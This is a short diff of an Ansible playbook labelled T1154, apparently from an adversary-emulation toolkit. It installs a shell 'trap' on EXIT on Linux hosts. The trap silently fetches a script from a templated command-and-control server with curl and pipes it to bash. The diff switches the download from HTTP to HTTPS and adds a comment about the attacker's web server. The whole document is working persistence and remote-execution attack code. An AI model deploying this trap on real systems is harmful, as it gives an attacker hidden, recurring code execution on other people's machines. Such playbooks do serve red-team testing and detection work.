@@ -1,5 +1,6 @@
 # Playbook-T1154
 # download and execute shell script everytime users exist
+# Attacker have webserver listting on https to download the script
 - name : Trap
   hosts: linux
   vars_files:
@@ -7,5 +8,5 @@
   tasks:
     - name:
       shell: |
-        trap 'nohup curl -sS http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ exfil_script}} | bash' EXIT
+        trap 'nohup curl -sS https://{{ cnc_fqdn }}:{{ cnc_port}}/{{ exfil_script}} | bash' EXIT
       
